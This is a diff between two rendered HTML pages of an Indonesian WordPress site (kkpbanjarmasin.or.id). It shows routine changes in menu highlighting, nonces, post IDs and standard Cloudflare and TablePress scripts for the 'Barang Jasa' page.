@@ -791,9 +756,9 @@ Email 	: 	  	kkp.banjarmasin@yahoo.co.id</div></div>				</div>
 			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5026"><a href="https://kkpbanjarmasin.or.id/daftar-register-permohonan/">Daftar Register Permohonan</a></li>
 		</ul>
 </li>
-		<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4762"><a href="https://kkpbanjarmasin.or.id/laporan-tersedia-setiap-saat/">Layanan Tersedia Setiap Saat</a>
+		<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-ancestor current-menu-parent current_page_parent current_page_ancestor menu-item-has-children menu-item-4762"><a href="https://kkpbanjarmasin.or.id/laporan-tersedia-setiap-saat/">Layanan Tersedia Setiap Saat</a>
 		<ul class="sub-menu">
-			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4807"><a href="https://kkpbanjarmasin.or.id/barang-jasa/">Barang Jasa</a></li>
+			<li class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-4779 current_page_item menu-item-4807"><a href="https://kkpbanjarmasin.or.id/barang-jasa/" aria-current="page">Barang Jasa</a></li>
 			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4808"><a href="https://kkpbanjarmasin.or.id/rencana-strategis/">Rencana Strategis</a></li>
 			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4809"><a href="https://kkpbanjarmasin.or.id/statistik/">Statistik</a></li>
 			<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4810"><a href="https://kkpbanjarmasin.or.id/informasi-bmn/">Informasi BMN</a></li>
@@ -825,7 +790,7 @@ Email 	: 	  	kkp.banjarmasin@yahoo.co.id</div></div>				</div>
 	</aside>
 <a id="close-sidebar-nav" class="header-1"><i class="fa fa-close"></i></a>
 	<a href="#" id="scroll-to-top"><i class="fa fa-angle-up"></i></a>
-            <script>
+            <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
                 jQuery(function($){
 
                     
@@ -928,21 +893,21 @@ wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-recipe/js/jquery.rateyo.min.js?ver=2.3" id="jquery-recipe-rateyo-js"></script>
 <script type="text/javascript" id="penci_rateyo-js-extra">
 /* <![CDATA[ */
-var PENCI = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d61f284b9e","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
+var PENCI = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-recipe/js/rating_recipe.js?ver=2.3.2" id="penci_rateyo-js"></script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-review/js/jquery.easypiechart.min.js?ver=1.0" id="jquery-penci-piechart-js"></script>
 <script type="text/javascript" id="penci-rateyo-review-js-extra">
 /* <![CDATA[ */
-var PENCI = {"postID":"2999","ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d61f284b9e","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
+var PENCI = {"postID":"4779","ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","normalFill":"#b9b9b9","ratedFill":"#FFCA00"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/penci-pennews-review/js/rating_review.js?ver=3.0" id="penci-rateyo-review-js"></script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/themes/pennews/js/script.lib.min.js?ver=6.6.1" id="penci-script-lib-js"></script>
 <script type="text/javascript" id="penci-js-extra">
 /* <![CDATA[ */
-var PENCILOCALIZE = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d61f284b9e","errorMsg":"Something wrong happened. Please try again.","login":"Email Address","password":"Password","errorPass":"<p class=\"message message-error\">Password does not match the confirm password<\/p>","prevNumber":"1","minlengthSearch":"0","linkTitle":"View More","linkTextAll":"Menu","linkText":"More"};
+var PENCILOCALIZE = {"ajaxUrl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","nonce":"d0b607a315","errorMsg":"Something wrong happened. Please try again.","login":"Email Address","password":"Password","errorPass":"<p class=\"message message-error\">Password does not match the confirm password<\/p>","prevNumber":"1","minlengthSearch":"0","linkTitle":"View More","linkTextAll":"Menu","linkText":"More"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/themes/pennews/js/script.min.js?ver=6.6.1" id="penci-js"></script>
@@ -954,7 +919,7 @@ var wpald = {"url":"https:\/\/kkpbanjarmasin.or.id\/wp-json\/wp\/v2\/media","typ
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/longdesc.min.js?ver=2.1.12" id="wpa.longdesc-js"></script>
 <script type="text/javascript" id="wp-accessibility-js-extra">
 /* <![CDATA[ */
-var wpa = {"skiplinks":{"enabled":false,"output":""},"target":"1","tabindex":"1","underline":{"enabled":false,"target":"a"},"dir":"ltr","lang":"en-US","titles":"1","labels":"1","wpalabels":{"s":"Search","author":"Name","email":"Email","url":"Website","comment":"Comment"},"current":"","errors":"","tracking":"1","ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","security":"4922ad1dc1","action":"wpa_stats_action","url":"https:\/\/kkpbanjarmasin.or.id\/sp4n-lapor\/","post_id":"2999"};
+var wpa = {"skiplinks":{"enabled":false,"output":""},"target":"1","tabindex":"1","underline":{"enabled":false,"target":"a"},"dir":"ltr","lang":"en-US","titles":"1","labels":"1","wpalabels":{"s":"Search","author":"Name","email":"Email","url":"Website","comment":"Comment"},"current":"","errors":"","tracking":"1","ajaxurl":"https:\/\/kkpbanjarmasin.or.id\/wp-admin\/admin-ajax.php","security":"4a1d679818","action":"wpa_stats_action","url":"https:\/\/kkpbanjarmasin.or.id\/barang-jasa\/","post_id":"4779"};
 /* ]]> */
 </script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/wp-accessibility/js/wp-accessibility.min.js?ver=2.1.12" id="wp-accessibility-js"></script>
@@ -998,5 +963,12 @@ var wpData = {"baseUrl":"https:\/\/kkpbanjarmasin.or.id"};
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/metaslider/script.min.js?ver=3.92.1" id="metaslider-script-js"></script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/ml-slider/assets/easing/jQuery.easing.min.js?ver=3.92.1" id="metaslider-easing-js"></script>
 <script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/horizontal-scrolling-announcements/script/jquery.marquee.min.js?ver=6.6.4" id="jquery.marquee.min-js"></script>
+<script type="text/javascript" src="https://kkpbanjarmasin.or.id/wp-content/plugins/tablepress/js/jquery.datatables.min.js?ver=2.4.4" id="tablepress-datatables-js"></script>
+<script type="text/javascript">
+jQuery(function($){
+var DT_language={"en_US":{}};
+$('#tablepress-3').DataTable({"language":DT_language["en_US"],"order":[],"orderClasses":false,"stripeClasses":["even","odd"],"pagingType":"simple"});
+});
+</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"02cc1a4c4bfc45ffbc53912b71552494","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
